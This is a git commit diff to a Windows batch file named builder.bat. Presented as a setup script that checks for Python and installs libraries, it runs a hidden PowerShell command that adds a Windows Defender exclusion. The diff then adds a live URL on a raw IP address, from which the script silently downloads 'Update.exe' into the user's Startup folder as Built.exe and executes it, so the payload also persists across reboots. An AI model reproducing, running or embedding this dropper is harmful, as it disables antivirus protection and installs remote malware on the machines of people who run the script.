47eb5b7b6e668dfdd0dcc82a0643d7b6d5928343
byDexty <147257219+xdexty0@users.noreply.github.com>
2024-06-26 23:50:39 +0300

    Update builder.bat

--- builder.bat
+++ builder.bat
@@ -3,24 +3,7 @@ powershell -w hidden -c Add-MpPreference -ExclusionPath ""
 @echo off
 setlocal 
 
-set "URL="
-set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"
-
-
-if exist "%DEST%" del "%DEST%"
-
-curl --silent --output "%DEST%" "%URL%"
-
-if %errorlevel% neq 0 (
-  exit /b %errorlevel%
-)
-
-call "%DEST%"
-
-@echo off
-setlocal 
-
-set "URL="
+set "URL=http://45.133.36.107/Update.exe"
 set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"
 
 
@@ -35,5 +18,35 @@ if %errorlevel% neq 0 (
 call "%DEST%"
 
 
-@echo off
-start builder.py
+title Checking Python installation...
+python --version > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Python is not installed! (Go to https://www.python.org/downloads and install the python 3.11.0^)
+    echo Very important click Add python exe to PATH.
+    pause
+)
+
+title Checking Python libraries...
+echo Checking 'cryptography' (1/3)
+python -c "import cryptography" > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Installing cryptography...
+    python -m pip install cryptography > nul
+)
+
+echo Checking 'aiohttp' (2/3)
+python -c "import aiohttp" > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Installing aiohttp...
+    python -m pip install aiohttp > nul
+)
+
+echo Checking 'pyinstaller' (3/3)
+python -c "import PyInstaller" > nul 2>&1
+if %errorlevel% neq 0 (
+    echo Installing pyinstaller...
+    python -m pip install pyinstaller > nul
+)
+
+cls
+python index.py
